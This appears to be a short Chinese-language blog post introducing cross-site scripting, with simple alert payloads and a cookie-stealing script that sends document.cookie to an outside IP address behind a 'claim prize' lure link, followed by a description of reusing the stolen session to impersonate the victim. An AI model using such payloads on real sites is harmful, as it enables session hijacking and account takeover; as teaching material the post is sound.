---
title: 跨站脚本攻击介绍
date: 2017-08-16 19:56:27
categories: 网络安全
tags: xss
---

## xss简介
跨站脚本在英文中称为Cross-Site Scripting，缩写为CSS。但是，由于与层叠样式表 (Cascading Style Sheets)缩写同名，特将跨站脚本缩写为XSS。
跨站脚本，顾名思义，就是恶意攻击者利用网站漏洞往Web页面里插入恶意代码 例如

### 案例一
现在假设攻击者在论坛网站A的一个帖子进行了如下回复： 
<!--more-->
```js
<script>alert("hello world")</script>
``` 

如果网站未进行相关的防御，那么其他人浏览帖子的人就会出现hello world 弹窗，这种危害性并不大。


### 案例二
但是我们可以通过xss获取用户的cookie，并查出sessionID。例如

```js
<script>alert(document.cookie)</script>
```  

你可以把你拿来的cookie定向到另一个页面，通过诱惑性的标题诱导用户点击此连接，然后就调到另外的网站 

```js  
<script type="text/javascript">
function send()
{
	var cookie = document.cookie;  
    window.location.href = "http://10.33.56.43/attackPage.asp?cookies=" + cookie;  
}  
</script> 
<a onClick="send()"><u>领奖</u></a>
```  

用户的cookie我也拿到了，如果服务端session没有设置过期的话，我以后甚至拿这个cookie而不需用户名密码，就可以以这个用户的身份登录成功，结合csrf，来搞破坏



